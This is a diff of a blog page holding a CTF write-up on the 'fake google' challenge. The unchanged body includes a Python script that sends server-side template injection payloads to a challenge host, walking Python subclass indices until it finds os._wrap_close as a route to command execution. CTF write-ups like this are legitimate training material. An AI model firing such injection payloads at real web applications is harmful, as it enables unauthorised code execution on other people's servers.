@@ -18,13 +18,14 @@
 <meta property="og:description" content="Web  [BJDCTF 2nd]fake google  经过测试，存在xss和模板注入，这题是模板注入参考文献##">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200325094541155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2020032412004079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200324120402833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2020032418425620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200324184718643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200324223518233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-03-24T07:07:45.000Z">
-<meta property="article:modified_time" content="2020-03-24T14:51:24.564Z">
+<meta property="article:modified_time" content="2020-03-25T01:48:19.075Z">
 <meta property="article:author" content="penson">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
@@ -253,7 +254,8 @@
 <blockquote>
 <p><strong>[BJDCTF 2nd]fake google</strong></p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过测试，存在xss和模板注入，这题是模板注入<br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">参考文献</a><br>##<a id="more"></a></p>
+<p><img src="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过测试，存在xss和模板注入，这题是模板注入<br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">参考文献</a><br>##<a id="more"></a><br><img src="https://img-blog.csdnimg.cn/20200325094541155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<hr>
 <p>可以发现是存在这个类的<br><img src="https://img-blog.csdnimg.cn/2020032412004079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来用脚本跑索引</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D;&quot;http:&#x2F;&#x2F;67a8fe61-a3c7-42f4-85ae-f8e301bd7f30.node3.buuoj.cn&#x2F;qaq&quot;</span><br><span class="line">temp&#x3D;&#123;&#125;</span><br><span class="line">for i in range(1000):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;537306c0-5737-4a8b-8db5-8fd5c2362b4f.node3.buuoj.cn&#x2F;qaq?name&#x3D;&#123;&#123;\&quot;\&quot;.__class__.__bases__[0].__subclasses__()[%d]&#125;&#125;&quot; % i</span><br><span class="line">    r &#x3D; requests.get(url)</span><br><span class="line">    print (url)</span><br><span class="line">    print(r.text)</span><br><span class="line">    if &quot;os._wrap_close&quot; in r.text:</span><br><span class="line">        print(url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
 
